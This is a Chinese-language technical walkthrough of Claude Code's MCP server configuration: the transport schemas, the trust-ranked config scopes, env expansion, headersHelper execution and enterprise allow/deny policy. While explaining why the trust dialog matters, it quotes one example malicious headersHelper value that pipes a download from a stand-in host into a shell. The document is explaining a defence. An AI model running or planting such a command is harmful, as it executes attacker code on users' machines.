# 01 McpServerConfig 与 8 种 transport schema

> 用户怎么告诉 Claude Code "连这个 MCP server"——配置文件 + Zod schema + scope 合并。本篇拆 8 种 schema 的字段差异、7 级配置 scope、env 展开 / headers helper、enterprise policy 限制。

## 1.1 用户配置长这样

最简单的 MCP server 配置（`.claude.json` / `settings.json`）：

```json
{
  "mcpServers": {
    "github": {
      "type": "stdio",
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-github"],
      "env": {
        "GITHUB_TOKEN": "${GITHUB_TOKEN}"
      }
    },
    "supabase": {
      "type": "http",
      "url": "https://api.supabase.com/mcp",
      "oauth": {
        "authServerMetadataUrl": "https://api.supabase.com/oauth/.well-known/oauth-authorization-server"
      }
    }
  }
}
```

每个 entry 是一个 `McpServerConfig`——8 种 transport 用 `type` 字段区分。

## 1.2 ConfigScope —— 7 级配置 scope

`types.ts:10-21`：

```ts
export const ConfigScopeSchema = lazySchema(() =>
  z.enum([
    'local',       // 项目本地 (~/.claude.json 里的 mcpServers)
    'user',        // 用户全局 (~/.claude.json 里 globally)
    'project',     // 项目级 (.mcp.json in project dir 或 parents)
    'dynamic',     // 运行时加进来的 (CLI / 工具调用)
    'enterprise',  // 企业管理的 (受 enterpriseMcpFilePath 控制)
    'claudeai',    // Claude.ai 网页用户的 server
    'managed',     // 用户由 admin 推送的 (强制启用)
  ]),
)
```

7 级 scope 体现不同**信任度**与**生效位置**：

| Scope | 来源 | 信任度 | 谁能改 |
|-------|------|--------|--------|
| `local` | 当前项目 `~/.claude.json` 的 `mcpServers` | 中 | 用户 (本机) |
| `user` | 用户全局配置 | 中 | 用户 (本机) |
| `project` | `.mcp.json` 在 git 仓库内 | **低**（可能来自不可信源） | 任何 PR 都能改 |
| `dynamic` | `claude mcp ...` 命令 / SDK API | 中 | 程序 |
| `enterprise` | `enterpriseMcpFilePath` | **高**（IT 管理员推送） | admin |
| `claudeai` | Claude.ai 服务端推送 | **高**（Anthropic 推送） | Anthropic |
| `managed` | admin policy（部分覆盖 user） | **高** | admin |

### `project` 不可信？

注意 `project` 信任度低——`.mcp.json` 在 git 仓库内，任何 PR 都能改。如果 PR 加一个恶意 MCP server 配置——用户 pull 后 Claude Code 启动就连上恶意 server。

防护：用户首次使用项目时弹 trust dialog——`checkHasTrustDialogAccepted()`。没确认信任前，**project scope 的 server 不会自动启用**。

## 1.3 8 种 server config schema

`types.ts:23-26` 定义了 6 种 transport type（plus 2 个 schema 里有但不在 enum 里）：

```ts
export const TransportSchema = lazySchema(() =>
  z.enum(['stdio', 'sse', 'sse-ide', 'http', 'ws', 'sdk']),
)
```

实际 schema 8 种（types.ts 里看完整）：

### `stdio` (28-35)

```ts
export const McpStdioServerConfigSchema = lazySchema(() =>
  z.object({
    type: z.literal('stdio').optional(),  // 向后兼容: 老配置可能没 type
    command: z.string().min(1, 'Command cannot be empty'),
    args: z.array(z.string()).default([]),
    env: z.record(z.string(), z.string()).optional(),
  }),
)
```

启动一个子进程——`command` + `args` + `env`。

`type` 是 **optional** 的——老配置默认 stdio。注释明确"Optional for backwards compatibility"。

### `sse` (58-66) / `http` (89-97) / `ws` (99-106)

3 种网络 transport schema 几乎一样：

```ts
{
  type: 'sse' | 'http' | 'ws',
  url: string,
  headers?: Record<string, string>,
  headersHelper?: string,
  oauth?: McpOAuthConfig
}
```

字段意义：

- `url`：server 地址；
- `headers`：静态 headers；
- `headersHelper`：动态 headers 脚本（CLI 命令名）——server 启动前 exec 它拿 headers（如动态 token）；
- `oauth`：OAuth 配置（如何取 token）。

### `sse-ide` (68-76) / `ws-ide` (78-87)

IDE 扩展专用：

```ts
McpSSEIDEServerConfigSchema = {
  type: 'sse-ide',
  url: string,
  ideName: string,                    // 'vscode' / 'jetbrains' 等
  ideRunningInWindows?: boolean,
}

McpWebSocketIDEServerConfigSchema = {
  type: 'ws-ide',
  url: string,
  ideName: string,
  authToken?: string,                 // IDE 给 server 用的 token
  ideRunningInWindows?: boolean,
}
```

**没有 OAuth**——IDE 扩展通过 `authToken` 或本地连接信任。
**有 `ideRunningInWindows` 标志**——Linux WSL 里跑 Claude Code 但 IDE 在 Windows 时的路径处理差异。

### `sdk` (108-113)

```ts
McpSdkServerConfigSchema = {
  type: 'sdk',
  name: string,                       // SDK 调用方提供的 server 名
}
```

最简单——只有 name。实际 server 实现由 SDK 调用方（嵌入 Claude Code SDK 的程序）通过 `SdkControlTransport` 注入。

### `claudeai-proxy` (116-122)

```ts
McpClaudeAIProxyServerConfigSchema = {
  type: 'claudeai-proxy',
  url: string,
  id: string,                         // Claude.ai 后端给的 server ID
}
```

**没有 oauth / headers**——认证由 Claude.ai proxy 自己处理。

### McpOAuthConfig

OAuth 子 schema (43-56)：

```ts
McpOAuthConfigSchema = {
  clientId?: string,                  // OAuth client ID (有些 server 要求预注册)
  callbackPort?: number,              // 本地回调端口 (默认随机)
  authServerMetadataUrl?: string,     // OAuth 2.0 metadata endpoint
  xaa?: boolean,                      // 是否用 xaa CAA 流程
}
```

`xaa: true` 切换到 ant 内部 IdP 路径——参见 [07 OAuth 认证](./07-OAuth与3套认证体系.md)。

## 1.4 McpServerConfig discriminated union

```ts
// types.ts:124-135
export const McpServerConfigSchema = lazySchema(() =>
  z.union([
    McpStdioServerConfigSchema(),
    McpSSEServerConfigSchema(),
    McpSSEIDEServerConfigSchema(),
    McpWebSocketIDEServerConfigSchema(),
    McpHTTPServerConfigSchema(),
    McpWebSocketServerConfigSchema(),
    McpSdkServerConfigSchema(),
    McpClaudeAIProxyServerConfigSchema(),
  ]),
)
```

Zod **discriminated union** 让类型自动收窄——用 `type` 字段判别。代码里：

```ts
switch (config.type) {
  case 'stdio': /* config is McpStdioServerConfig */; break
  case 'sse': /* config is McpSSEServerConfig */; break
  // ...
}
```

类型安全 + 运行时 Zod 校验——schema-first 设计。

## 1.5 ScopedMcpServerConfig —— 加 scope 元数据

```ts
// types.ts:163-169
export type ScopedMcpServerConfig = McpServerConfig & {
  scope: ConfigScope
  // For plugin-provided servers: the providing plugin's LoadedPlugin.source
  pluginSource?: string
}
```

加载后的 config 多两个字段：

- `scope`：来自哪个 scope；
- `pluginSource`：plugin 提供时记下 plugin 来源（如 `'slack@anthropic'`）。

`pluginSource` 用于 channel allowlist——某些 plugin 的 server 默认信任。

## 1.6 getMcpConfigsByScope —— 按 scope 加载

`config.ts:888-1026` 是核心加载函数。每个 scope 走不同路径：

### `project` scope —— 向上遍历

```ts
case 'project': {
  const allServers: Record<string, ScopedMcpServerConfig> = {}
  const dirs: string[] = []
  let currentDir = getCwd()

  // 向上收集所有目录
  while (currentDir !== parse(currentDir).root) {
    dirs.push(currentDir)
    currentDir = dirname(currentDir)
  }

  // 从根到 CWD 处理 (近处优先级高)
  for (const dir of dirs.reverse()) {
    const mcpJsonPath = join(dir, '.mcp.json')
    const { config, errors } = parseMcpConfigFromFilePath({ ... })
    if (config?.mcpServers) {
      Object.assign(allServers, addScopeToServers(config.mcpServers, scope))
    }
  }
  return { servers: allServers, errors: allErrors }
}
```

**向上找 `.mcp.json`**——和 git 寻找仓库根的策略类似。**近处覆盖远处**（CWD 比 parent 优先级高）。

### `user` scope —— 全局 config

```ts
case 'user': {
  const mcpServers = getGlobalConfig().mcpServers
  // ...
  return { servers: addScopeToServers(config?.mcpServers, scope), errors }
}
```

从 `~/.claude.json` 全局 config 读取 `mcpServers`。

### `local` scope —— 项目本地 config

```ts
case 'local': {
  const mcpServers = getCurrentProjectConfig().mcpServers
  // ...
}
```

从**当前项目的本地配置**（`~/.claude/projects/{sanitized-cwd}/...`）读取——不在 git 仓库内、不会被分享。

### `enterprise` scope —— 企业管理

```ts
case 'enterprise': {
  const enterpriseMcpPath = getEnterpriseMcpFilePath()
  const { config, errors } = parseMcpConfigFromFilePath({ ... })
  // ...
}
```

`getEnterpriseMcpFilePath()` 在 macOS 是 `/Library/Application Support/ClaudeCode/managed-mcp.json` 之类——IT 管理员 push 的强制配置。

## 1.7 expandEnvVars —— `${VAR}` / `${VAR:-default}` 展开

`envExpansion.ts:9-43`：

```ts
export function expandEnvVarsInString(value: string): {
  expanded: string
  missingVars: string[]
} {
  const missingVars: string[] = []

  const expanded = value.replace(/\$\{([^}]+)\}/g, (match, varContent) => {
    // 支持 ${VAR:-default}
    const [varName, defaultValue] = varContent.split(':-', 2)
    const envValue = process.env[varName]

    if (envValue !== undefined) return envValue
    if (defaultValue !== undefined) return defaultValue

    missingVars.push(varName)
    return match  // 保留原样让用户能 debug
  })

  return { expanded, missingVars }
}
```

支持 2 种语法：

- `${GITHUB_TOKEN}` —— 简单替换；
- `${PORT:-3000}` —— 带 default。

**缺失时返回原样而不抛错**——但报告 missingVars 让上层处理。这种 **soft fail + 报告** 让用户能 debug（看到 `${VAR}` 没展开就知道是哪个 var 缺）。

`expandEnvVars` 在 config.ts:556+ 实现完整版本——遍历 config 所有字符串字段，把 `${VAR}` 都展开。

## 1.8 headersHelper —— 动态 headers 脚本

部分 HTTP server 需要动态 headers（如每次刷新 token）——`headersHelper` 配置一个 CLI 命令，server 连接前 exec 它拿 headers。

`headersHelper.ts:46-100`：

```ts
export async function getMcpHeadersFromHelper(
  serverName: string,
  config: McpSSEServerConfig | McpHTTPServerConfig | McpWebSocketServerConfig,
): Promise<Record<string, string> | null> {
  if (!config.headersHelper) return null

  // 安全检查: project/local scope 必须先确认 trust
  if (
    'scope' in config &&
    isMcpServerFromProjectOrLocalSettings(config as ScopedMcpServerConfig) &&
    !getIsNonInteractiveSession()
  ) {
    const hasTrust = checkHasTrustDialogAccepted()
    if (!hasTrust) {
      logAntError('MCP headersHelper invoked before trust check', ...)
      return null
    }
  }

  const execResult = await execFileNoThrowWithCwd(config.headersHelper, [], {
    shell: true,
    timeout: 10000,
    env: {
      ...process.env,
      CLAUDE_CODE_MCP_SERVER_NAME: serverName,
      CLAUDE_CODE_MCP_SERVER_URL: config.url,
    },
  })
  // ...
  const headers = jsonParse(execResult.stdout.trim())
  return headers
}
```

3 个安全细节：

### 1. 必须 trust 才能 exec

如果 server 是 `project` / `local` scope（来自不可信源）→ 必须先有 trust dialog 确认。**否则 PR 加一个 `headersHelper: "curl evil.com | sh"` 就能执行任意命令**。

### 2. 10 秒超时

`timeout: 10000`——helper 必须 10 秒内返回 headers。防止恶意/卡死的 helper 拖慢 Claude Code 启动。

### 3. 传 server 上下文

```ts
env: {
  ...process.env,
  CLAUDE_CODE_MCP_SERVER_NAME: serverName,
  CLAUDE_CODE_MCP_SERVER_URL: config.url,
}
```

helper 通过环境变量知道是哪个 server 在请求 headers——支持**一个 helper 服务多个 server**（注释引用 deshaw/anthropic-issues#28 — git credential-helper style）。

### 4. 输出必须是 JSON

`jsonParse(execResult.stdout.trim())`——helper 输出 JSON。失败抛错。

## 1.9 dedupPluginMcpServers / dedupClaudeAiMcpServers

`config.ts:223+` 和 `281+` 处理两种特殊去重：

### dedupPluginMcpServers

同一个 server 可能被多个 plugin 提供——dedup 去掉重复。判定 dup 的依据：

- 同 type + 同 command/url；
- 或同 `getMcpServerSignature(config)`——基于 config 内容生成的稳定 hash。

### dedupClaudeAiMcpServers

Claude.ai proxy server 可能在多个 scope 出现——dedup 时偏好高 scope 来源（Anthropic 推送 > 用户本地 cache）。

## 1.10 policy filter —— filterMcpServersByPolicy

`config.ts:536-554`（推断签名）：

```ts
export function filterMcpServersByPolicy<T>(configs: Record<string, T>): {
  allowed: Record<string, T>
  denied: { name: string; reason: string }[]
} {
  // ...
}
```

根据 settings 里的 allowlist / denylist 过滤。两个独立列表：

- `mcpAllowlist`：只允许这些 server（其余全 deny）；
- `mcpDenylist`：禁止这些 server（其余全 allow）。

支持 **URL pattern** 通配符：

```ts
// config.ts:320-330
function urlPatternToRegex(pattern: string): RegExp {
  // 把 'https://*.example.com/*' 转 regex
}
function urlMatchesPattern(url: string, pattern: string): boolean { ... }
```

让 admin 能配 `Allow: https://*.internal.company.com/*`——精确控制企业内部哪些 server 能用。

## 1.11 isMcpServerDenied —— 多重检查

`config.ts:364+`（推断）：

```ts
function isMcpServerDenied(name, config, denylist): boolean {
  // 1. 名字 deny
  if (denylist.byName?.includes(name)) return true

  // 2. URL pattern deny
  if (config.url && denylist.byUrl?.some(p => urlMatchesPattern(config.url, p))) {
    return true
  }

  // 3. Command deny (stdio)
  if (config.command && denylist.byCommand?.includes(config.command)) {
    return true
  }

  return false
}
```

多维度 deny 列表——admin 能从不同角度限制（按名字 / URL / 命令）。

## 1.12 shouldAllowManagedMcpServersOnly —— 锁死模式

`config.ts:1485+`：

```ts
export function shouldAllowManagedMcpServersOnly(): boolean {
  // 检查 enterprise config 是否设了 onlyAllowManaged: true
  return doesEnterpriseMcpConfigExist() && enterpriseConfig.onlyAllowManaged
}
```

企业部署可以**完全锁死** MCP——只允许 enterprise scope 的 server。用户本地配置全部失效。

这是个**核选项**——给真正敏感的环境用（金融、医疗），让 admin 100% 控制 MCP 使用。

## 1.13 几个隐性设计判断

### 1. discriminated union 解决 transport 多态

8 种 transport 用 Zod discriminated union，运行时 + 编译期都类型安全。**schema-first** 设计——schema 是 source of truth。

### 2. 7 级 scope 反映信任度

`enterprise > managed > claudeai > local/user/dynamic > project`。**外部不可信源（project / 由 PR 加的）受最严格审查**——必须 trust dialog 才能用 headersHelper 等危险特性。

### 3. project scope 向上遍历

像 git 找 `.git`——CWD 开始向上找 `.mcp.json`。多个目录都有的话**合并**（近处优先）。这种**层级配置**让 monorepo 子项目能继承父级配置但又能 override。

### 4. env 展开 soft fail + 报告

`${MISSING_VAR}` 不抛错——保留原样让 debug 容易，但报告 missingVars 让 UI 显示警告。

### 5. headersHelper 必须先 trust

防止 PR 引入恶意 helper 执行任意命令。**首次使用项目必须 trust dialog**——这是 Claude Code 整体的 trust 模型。

### 6. dedup 用 signature hash

同一 server 多源提供时去重——用 `getMcpServerSignature(config)` 算 stable hash（基于 config 字段）。简单可靠。

### 7. enterprise 锁死模式

`onlyAllowManaged` 完全禁用用户本地 MCP——给最敏感场景。这种**有完全锁死能力**的设计让企业能在不放弃 MCP 的同时控制风险。

### 8. claudeai scope 用 server 推送

Claude.ai 用户的 server 列表由 Anthropic 后端推送——用户不需要手动配。和"用户 manage local config"模型不同。

## 1.14 与 [overview 10 配置系统](../../overview/10-配置系统与Git集成.md) 的关系

[overview 10] 讲 Claude Code 整体的配置系统（六级 scope）。MCP 配置是**它的子集**——共享同样的 scope 机制：

| Claude Code 整体 6 级 | MCP 7 级 | 关系 |
|---------------------|---------|------|
| local | local | 完全对应 |
| user | user | 完全对应 |
| project | project | 完全对应 |
| dynamic | dynamic | 完全对应 |
| enterprise | enterprise | 完全对应 |
| managed | managed | 完全对应 |
| (无) | **claudeai** | MCP 特有：Anthropic 后端推送 |

MCP 多了 `claudeai` scope——因为 Anthropic 想为 Claude.ai 用户托管 MCP server 列表。

## 1.15 小结

- 7 级配置 scope (local / user / project / dynamic / enterprise / claudeai / managed)，体现信任度差异；
- 8 种 transport schema：stdio / sse / http / ws / sse-ide / ws-ide / sdk / claudeai-proxy；
- Zod discriminated union 让 type-safe + runtime validate 同时实现；
- `project` scope 向上遍历找 `.mcp.json`，近处优先级高；
- `${VAR}` / `${VAR:-default}` env 展开 soft fail + missingVars 报告；
- `headersHelper` 动态 headers，**必须先 trust** 才能 exec；
- `dedupPluginMcpServers` / `dedupClaudeAiMcpServers` 多源去重用 signature hash；
- `filterMcpServersByPolicy` 支持 URL pattern 通配符让 admin 精确 deny；
- `shouldAllowManagedMcpServersOnly` 完全锁死模式给敏感环境用；
- `claudeai` scope 是 MCP 特有——Anthropic 后端推送 server 列表给 Claude.ai 用户。

下一篇 → [02 stdio 与子进程 transport](./02-stdio与子进程transport.md)
